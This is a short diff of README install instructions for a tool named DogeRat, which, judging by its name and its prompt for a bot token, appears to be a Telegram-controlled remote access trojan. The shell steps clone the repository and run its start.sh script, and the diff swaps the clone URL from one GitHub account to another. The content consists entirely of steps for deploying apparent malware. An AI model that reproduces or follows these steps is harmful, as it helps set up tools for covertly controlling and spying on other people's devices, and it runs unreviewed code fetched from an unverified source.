@@ -94,7 +94,7 @@
 ```bash  
   pkg update && upgrade -y
   pkg install git -y
-  git clone https://github.com/shivaya-dav/DogeRat 
+  git clone https://github.com/justtrial8792/DogeRat 
   cd DogeRat
   bash start.sh
 Enter your bot token 
